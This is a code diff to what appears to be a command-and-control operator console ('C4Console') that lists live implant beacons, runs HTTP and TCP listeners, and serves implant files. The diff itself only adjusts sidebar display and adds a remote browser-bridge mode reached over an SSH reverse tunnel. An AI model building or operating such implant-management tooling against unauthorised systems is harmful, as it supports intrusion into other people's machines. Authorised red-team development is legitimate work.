@@ -38,7 +38,7 @@ from encode import (  # noqa: E402
 
 # Add operator/ dir to path for browser_bridge
 sys.path.insert(0, str(Path(__file__).resolve().parent))
-from browser_bridge import BrowserBridge  # noqa: E402
+from browser_bridge import BrowserBridge, BrowserBridgeClient  # noqa: E402
 
 from aiohttp import web
 from rich.text import Text
@@ -450,7 +450,8 @@ async def start_http(port: int) -> web.AppRunner:
 # ---------------------------------------------------------------------------
 
 # Browser bridge instance (shared across the app)
-browser_bridge = BrowserBridge(headless=True)
+# Will be set to BrowserBridge (local) or BrowserBridgeClient (remote) based on --bridge-mode
+browser_bridge: BrowserBridge | BrowserBridgeClient = BrowserBridge(headless=True)
 
 
 async def _handle_tcp_client(
@@ -533,10 +534,15 @@ class BeaconListItem(ListItem):
     def compose(self) -> ComposeResult:
         status = "●" if self.beacon.is_alive else "○"
         color = "green" if self.beacon.is_alive else "red"
-        implant = self.beacon.implant_id[:20] if self.beacon.implant_id else ""
+        # Use shorter implant ID (12 chars) to fit sidebar
+        implant = self.beacon.implant_id[:12] if self.beacon.implant_id else ""
         ip = self.beacon.ip
+        # Truncate display_name if too long for sidebar (max ~35 chars with status)
+        name = self.beacon.display_name
+        if len(name) > 32:
+            name = name[:29] + "..."
         yield Label(
-            f"[{color}]{status}[/] {self.beacon.display_name}\n"
+            f"[{color}]{status}[/] {name}\n"
             f"  [dim]{implant}[/]\n"
             f"  [dim]{ip}[/]",
             markup=True,
@@ -603,7 +609,7 @@ class C4Console(App):
     }
 
     #beacon-sidebar {
-        width: 36;
+        width: 42;
         border-right: solid $accent;
         height: 100%;
     }
@@ -729,6 +735,7 @@ class C4Console(App):
         self._start_http_listener()
         self._start_tcp_listener()
         self._start_status_refresh()
+        self._connect_browser_bridge()
 
     @work(exclusive=True, group="http")
     async def _start_http_listener(self) -> None:
@@ -744,6 +751,17 @@ class C4Console(App):
         while True:
             await asyncio.sleep(5)
             self.refresh_beacons()
+
+    @work(exclusive=True, group="bridge")
+    async def _connect_browser_bridge(self) -> None:
+        """Connect to remote browser bridge if using remote mode."""
+        if isinstance(browser_bridge, BrowserBridgeClient):
+            try:
+                await browser_bridge.connect()
+                self._log("[green]Connected to remote browser bridge[/]")
+            except Exception as e:
+                self._log(f"[red]Failed to connect to browser bridge: {e}[/]")
+                self._log("[yellow]Ensure browser_bridge_local.py is running and SSH tunnel is active[/]")
 
     # -- Beacon notifications ----------------------------------------------
 
@@ -1192,6 +1210,17 @@ def main() -> None:
         default=None,
         help="Root output directory (e.g. implants/). Files accessible at GET /serve/<implant-id>/<filename>",
     )
+    parser.add_argument(
+        "--bridge-mode",
+        choices=["local", "remote"],
+        default="local",
+        help="Browser bridge mode: 'local' runs browser directly, 'remote' forwards to local machine via tunnel",
+    )
+    parser.add_argument(
+        "--bridge-url",
+        default="ws://localhost:8888",
+        help="WebSocket URL for remote browser bridge (default: ws://localhost:8888)",
+    )
     args = parser.parse_args()
 
     global _SERVE_DIR
@@ -1201,9 +1230,18 @@ def main() -> None:
             print(f"[!] --serve-dir does not exist: {_SERVE_DIR}")
             sys.exit(1)
 
-    browser_bridge.headless = not args.headed
-    if args.browser_profile:
-        browser_bridge.user_data_dir = str(args.browser_profile.resolve())
+    global browser_bridge
+    if args.bridge_mode == "remote":
+        # Use remote bridge client - connects to local machine via tunnel
+        browser_bridge = BrowserBridgeClient(ws_url=args.bridge_url)
+        print(f"[*] Using remote browser bridge: {args.bridge_url}")
+        print("[*] Ensure browser_bridge_local.py is running on your local machine")
+        print(f"[*] SSH tunnel: ssh -R 8888:localhost:8888 <user>@<this-host>")
+    else:
+        # Use local browser bridge (direct Playwright/Camoufox)
+        browser_bridge = BrowserBridge(headless=not args.headed)
+        if args.browser_profile:
+            browser_bridge.user_data_dir = str(args.browser_profile.resolve())
 
     app = C4Console()
     app.listen_port = args.port
